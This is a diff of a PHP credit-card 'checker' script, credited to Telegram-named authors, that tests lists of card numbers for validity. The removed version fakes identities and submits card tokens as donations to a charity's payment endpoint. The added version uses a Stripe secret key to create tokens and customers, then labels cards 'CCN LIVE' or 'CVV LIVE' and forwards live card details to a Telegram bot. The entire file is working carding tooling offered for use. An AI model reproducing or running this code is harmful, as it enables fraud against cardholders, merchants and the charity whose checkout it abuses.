@@ -1,196 +1,222 @@
 <?php
+//Script Author: ᴛɪᴋᴏʟ4ʟɪғᴇ https://t.me/Tikol4Life
 
-////////////////////////////===[........................]
-
+/*===[PHP Setup]==============================================*/
 error_reporting(0);
-set_time_limit(0);
-error_reporting(0);
-date_default_timezone_set('America/Buenos_Aires');
+ini_set('display_errors', 0);
 
+/*===[Include Setup]==========================================*/
+include 'preset.php';
 
-function multiexplode($delimiters, $string)
-{
-  $one = str_replace($delimiters, $delimiters[0], $string);
-  $two = explode($delimiters[0], $one);
-  return $two;
+/*===[cURL Processes]=========================================*/
+/* 1st cURL */
+$ch1 = curl_init();
+curl_setopt($ch1, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch1, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&card[cvc]='.$cvv);
+curl_setopt($ch1, CURLOPT_USERPWD, $sk. ':' . '');
+$headers = array();
+$headers[] = 'Content-Type: application/x-www-form-urlencoded';
+curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
+$curl1 = curl_exec($ch1);
+curl_close($ch1);
+
+/* 1st cURL Response */
+$res1 = json_decode($curl1, true);
+$card = $res1['card']['id'];
+
+if(isset($res1['id'])){
+    /* 2nd cURL */
+    $ch2 = curl_init();
+    curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch2, CURLOPT_POST, 1);
+    curl_setopt($ch2, CURLOPT_POSTFIELDS, 'email='.$email.'&description=Tikol4Life&source='.$res1["id"].'&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US');
+    curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
+    $headers = array();
+    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
+    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
+    $curl2 = curl_exec($ch2);
+    curl_close($ch2);
+
+    /* 2nd cURL Response */
+    $res2 = json_decode($curl2, true);
+    $cus = $res2['id'];
+    
 }
-$lista = $_GET['lista'];
-$cc = multiexplode(array(":", "|", ""), $lista)[0];
-$mes = multiexplode(array(":", "|", ""), $lista)[1];
-$ano = multiexplode(array(":", "|", ""), $lista)[2];
-$cvv = multiexplode(array(":", "|", ""), $lista)[3];
 
-function GetStr2($string, $start, $end)
-{
-  $str = explode($start, $string);
-  $str = explode($end, $str[1]);
-  return $str[0];
+if (isset($res2['id'])&&!isset($res2['sources'])) {
+    /* 3rd cURL */
+    $ch3 = curl_init();
+    curl_setopt($ch3, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$cus.'/sources/'.$card);
+    curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch3, CURLOPT_CUSTOMREQUEST, 'GET');
+    curl_setopt($ch3, CURLOPT_USERPWD, $sk . ':' . '');
+    $headers = array();
+    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
+    curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
+    $curl3 = curl_exec($ch3);
+    curl_close($ch3);
+
+    /* 3rd cURL Response */
+    $res3 = json_decode($curl3, true);
+
 }
 
-function strposa($haystack, $needles=array(), $offset=0) {
-    $chr = array();
-    foreach($needles as $needle) {
-        $res = strpos($haystack, $needle, $offset);
-        if ($res !== false) $chr[$needle] = $res;
+
+/*===[cURL Response Setup]====================================*/
+if(isset($res1['error'])){
+    //DEAD
+    $code = $res1['error']['code'];
+    $decline_code = $res1['error']['decline_code'];
+    $message = $res1['error']['message'];
+
+    if(isset($res1['error']['decline_code'])){
+        $codex = $decline_code;
+    }else{
+        $codex = $code;
     }
-    if(empty($chr)) return false;
-    return min($chr);
+    $err = ''.$res1['error']['message'].' '.$codex;
+    
+    if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
+        //CCN LIVE
+        if(isset($telebot) && $telebot != ""){
+            if($tele_msg == "2"|| $tele_msg == "3") {
+                BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
+            }
+        }
+        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
+    }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
+        //CVV LIVE: Insufficient Funds
+        if(isset($telebot) && $telebot != ""){
+            if($tele_msg == "1"|| $tele_msg == "3") {
+                BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
+            }
+        }
+        EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
+    }elseif($code == "lost_card"||$decline_code == "lost_card"){
+        //CCN LIVE: Lost Card
+        if(isset($telebot) && $telebot != ""){
+            if($tele_msg == "2"|| $tele_msg == "3") {
+                BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
+            }
+        }
+        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
+    }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
+        //CCN LIVE: Stolen Card
+        if(isset($telebot) && $telebot != ""){
+            if($tele_msg == "2"|| $tele_msg == "3") {
+                BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
+            }
+        }
+        EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
+    }elseif($code == "testmode_charges_only"||$decline_code == "testmode_charges_only"){
+        //TESTMODE CHARGES
+        EchoMessage('DEAD',$cc_info.' >> SK Error: TestMode Charges ');
+    }elseif(strpos($curl1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
+        //INTEGRATION ERROR
+        EchoMessage('DEAD',$cc_info.' >> SK Error: Integration');
+    }elseif(strpos($curl1, "You must verify a phone number on your Stripe account before you can send raw credit card numbers to the Stripe API.")){
+        //VERIFY NUMBER
+        EchoMessage('DEAD',$cc_info.' >> SK Error: Verify Phone Number');
+    }else{
+        //DEAD
+        EchoMessage('DEAD',$cc_info.' >> '.$err);
+    }
+}else{
+    if (isset($res2['error'])) {
+        //DEAD
+        $code = $res2['error']['code'];
+        $decline_code = $res2['error']['decline_code'];
+        $message = $res2['error']['message'];
+        if(isset($res2['error']['decline_code'])){
+            $codex = $decline_code;
+        }else{
+            $codex = $code;
+        }
+        $err = ''.$res2['error']['message'].' '.$codex;
+
+        if($code == "incorrect_cvc"||$decline_code == "incorrect_cvc"){
+            //CCN LIVE
+            if(isset($telebot) && $telebot != ""){
+                if($tele_msg == "2"|| $tele_msg == "3") {
+                    BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
+                }
+            }
+            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
+        }elseif($code == "insufficient_funds"||$decline_code == "insufficient_funds"){
+            //CVV LIVE: Insufficient Funds
+            if(isset($telebot) && $telebot != ""){
+                if($tele_msg == "1"|| $tele_msg == "3") {
+                    BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
+                }
+            }
+            EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
+        }elseif($code == "lost_card"||$decline_code == "lost_card"){
+            //CCN LIVE: Lost Card
+            if(isset($telebot) && $telebot != ""){
+                if($tele_msg == "2"|| $tele_msg == "3") {
+                    BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
+                }
+            }
+            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
+        }elseif($code == "stolen_card"||$decline_code == "stolen_card"){
+            //CCN LIVE: Stolen Card
+            if(isset($telebot) && $telebot != ""){
+                if($tele_msg == "2"|| $tele_msg == "3") {
+                    BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
+                }
+            }
+            EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
+        }else{
+            //DEAD
+            EchoMessage('DEAD',$cc_info.' >> '.$err);
+        }
+    }else{
+        if (isset($res2['sources'])) {
+            $cvc_res2 = $res2['sources']['data'][0]['cvc_check'];
+            if($cvc_res2 == "pass"||$cvc_res2 == "success"){
+                //CVV MATCH CONGRATS
+                if(isset($telebot) && $telebot != ""){
+                    if($tele_msg == "1"|| $tele_msg == "3") {
+                        BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match%0A",$telebot);
+                    }
+                }
+                EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res2);
+            }else{
+                //DEAD
+                EchoMessage('DEAD',$cc_info.' >> cvc_check : '.$cvc_res2);
+            }
+        }else{
+            $cvc_res3 = $res3['cvc_check'];
+            if($cvc_res3 == "pass"||$cvc_res3 == "success"){
+                //CVV MATCH CONGRATS
+                if(isset($telebot) && $telebot != ""){
+                    if($tele_msg == "1"|| $tele_msg == "3") {
+                        BotForwarder("<b>Team Legend</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match%0A",$telebot);
+                    }
+                }
+                EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res3);
+            }else{
+                //DEAD
+                EchoMessage('DEAD',$cc_info.' >> cvc_check : '.$cvc_res3);
+            }
+        }
+    }
 }
 
-////////////////////////////===[Randomizing Details Api]
-
-$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
-preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
-$name = $matches1[1][0];
-preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
-$last = $matches1[1][0];
-preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
-$email = $matches1[1][0];
-preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
-$street = $matches1[1][0];
-preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
-$city = $matches1[1][0];
-preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
-$state = $matches1[1][0];
-preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
-$phone = $matches1[1][0];
-preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
-$postcode = $matches1[1][0];
-
-////////////////////////////===[For Authorizing Cards]
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'Host: api.stripe.com',
-'Accept: application/json',
-'Content-Type: application/x-www-form-urlencoded',
-'Origin: https://checkout.stripe.com',
-'Referer: https://checkout.stripe.com/v3/GIQm89WqdPipo5cyACzNQ.html?distinct_id=adfe949a-9c2e-579b-6b9a-86d7e9a14ae5',
-'Sec-Fetch-Mode: cors',
-'sec-fetch-site: same-site',
- 'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36'));
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2Fa44017d)&user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+SM-A505GN)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F83.0.4103.96+Mobile+Safari%2F537.36&device_id=a16af626-3e73-45c9-9ba0-033e6c98e3f9&referrer=https%3A%2F%2Fhipgive.org%2Fdonate%2F%3Ftab%3Dpay%26pid%3D69649&pasted_fields=number&time_checkout_opened=1591895744&time_checkout_loaded=1591895743&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]='.$name.'&card[address_zip]='.$postcode.'&time_on_page=21266&guid=e2334d9c-d229-4ee8-8da3-00393f5adb5e&muid=ae1caa1e-7ab8-4fc9-ac37-d8e438cffef6&sid=2c5896b7-feb3-47fe-8e3d-3d6d2554a9b6&key=pk_live_UiypA2fdZJi1FEclcCUcvXs500T59cXjOT');
-
-$resulta = curl_exec($ch);
-$resulta1 = json_decode($resulta, true);
-
-$message = trim(strip_tags(getStr2($resulta,'"message": "','"')));
-$code = $resulta1['error']['code'];
-$dcode = $resulta1['error']['decline_code'];
-$token = $resulta1['id'];
-$cvc = trim(strip_tags(getStr2($resulta,'"cvc_check": "','"')));
-curl_close($ch);
-///====2nd req========///
-
- $ch = curl_init();
- curl_setopt($ch, CURLOPT_URL, 'https://data.hiponline.org/api/hipgive/541e6336-2dc1-4e49-a956-02c466d4d23d/donation');
- curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
- curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
- curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
- curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
- curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
- curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-   'Host: data.hiponline.org',   
-   'accept: application/json, text/plain, */*',
-   'origin: https://hipgive.org',
-   'content-type: application/json;charset=UTF-8',
-   'X-Requested-With: XMLHttpRequest',
-   'referer: https://hipgive.org/donate/?tab=pay&pid=69649',
-   'user-agent: Mozilla/5.0 (Linux; Android 10; SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',
-   'sec-fetch-mode: cors',
-));
- curl_setopt($ch, CURLOPT_POSTFIELDS, '{"identity":"541e6336-2dc1-4e49-a956-02c466d4d23d","wp_donation_id":72934,"token_id":"'.$token.'","project":"Their future starts here: Support their education"}');
-
-$resultb = curl_exec($ch);
-$resultb1 = json_decode($resultb, true);
-$mess2 = trim(strip_tags(getStr2($resultb,'{"status":"error","identity":"541e6336-2dc1-4e49-a956-02c466d4d23d","errors":["','"]}'))); 
-
-////////////////////////////=====[Bank-Information]
-
-function getbnk($bin)
-{
- sleep(rand(1,6));
-$bin = substr($bin,0,6);
-$url = 'http://bins.su';
-//  Initiate curl
-$ch = curl_init();
-// Disable SSL verification
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-// Will return the response, if false it print the response
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-// Set the url
-curl_setopt($ch, CURLOPT_URL,$url);
-// Execute
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&BIN=&country=');
-$result=curl_exec($ch);
-// Closing
-curl_close($ch);
-
-// Will dump a beauty json :3
-//var_dump(json_decode($result, true));
-
-if (preg_match_all('(<tr><td>'.$bin.'</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>)siU', $result, $matches1))
-{
-$r1 = $matches1[1][0];
-$r2 = $matches1[2][0];
-$r3 = $matches1[3][0];
-$r4 = $matches1[4][0];
-$r5 = $matches1[5][0];
-//if(stristr($result,$ip'<tr><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td><td>(.*)</td></tr>'))
-
- return "$bin|$r2 - $r1 - $r3 - $r4 - $r5";
-
-}
-else
-{
- return "$bin|Unknown.";
-}
+if ($testMode) {
+    echo '<pre>';
+    echo "1st cURL <br>";
+    echo json_encode($res1, JSON_PRETTY_PRINT);
+    if (isset($res1['id'])) {
+        echo "<br><br>2nd cURL <br>";
+        echo json_encode($res2, JSON_PRETTY_PRINT);
+    }
+    if (isset($res2['id'])&&!isset($res2['sources'])) {
+        echo "<br><br>3rd cURL <br>";
+        echo json_encode($res3, JSON_PRETTY_PRINT);
+    }
 }
 
-
-
-
-////////////////////////////===[Card Response]
-
-if (strpos(resultb, '"status":"error"')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b>- > 🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
-} elseif (strpos($resulta, '"cvc_check": "pass"')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> -> <b> 🔥 OUTCOME -> cvc_check: '.$cvc.' </span>  </br>';
-}elseif (strpos($resulta, 'zip code you supplied failed validation')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i>- > [Code]: '.$mess3.' [D-Code]: cvc_check: '.$cvc.' </span>  </br>';
-} elseif (strpos($resulta, "Your card's security code is incorrect.")) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[03]</span> ¤ <span class="text-dark">#CCN</span> -> <span class="text-success"> [ CCN MATCHED ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span> <span class="text-success"> <b><i> - > [Code]: '.$code.' [D-Code]: '.$message.' </span> </br>';
-} elseif (strpos($resultb, 'Your card has insufficient funds.')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME -> [D-Code]: cvc_check: '.$cvc.' </span></br>';
-} elseif (strpos($resulta, 'Your card has insufficient funds.')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ CVV MATCHED ] [ insufficient funds ]</span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> -> <b>🔥 OUTCOME [D-Code]: cvc_check: '.$cvc.' </span></br>';
-} elseif (strpos($resulta, 'lost_card')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.' </span></br>';
-} elseif (strpos($resulta, 'stolen_card')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
-} elseif (strpos($resulta, '"cvc_check": "unavailable"')) {
-    echo'<b><span class="badge badge-danger"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [Code]: '.$mess2.' [D-Code]: '.$dcode.' -> cvc_check: '.$cvc.' <b><i></span> </br>';
-}elseif (strpos($resulta, 'pickup_card')) {
-    echo '<b><span class="badge badge-success"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> ¤ <span class="text-dark">[05]</span> ¤ <span class="text-dark">#Approved</span> -> <span class="text-success"> [ APPROVED CARD! ] </span> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-success"> <b><i> - > [D-Code]: '.$dcode.' -> '.$code.'  </span></br>';
-} 
-else {
-    echo'<b><span class="badge badge-danger"> GATE 2 </span> <span class="text-dark">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</b></span> <span class="text-dark">[00]</span> -> <span class="text-danger">#Declined </span> <span class="text-danger"> -> <span class="text-dark"> BIN: - '.getbnk($cc).'</span><span><span class="text-danger"> <b><i>- > [D-Code]: '.$dcode.' -> '.$code.' <b><i></span> </br>';
-}
-
-curl_close($ch);
-ob_flush();
-//////=========Comment Echo $result If U Want To Hide Site Side Response
-
-
-
-///////////////////////////////////////////////===========================Edited By CHILLZ ♤ ================================================\\\\\\\\\\\\\\\
 ?>
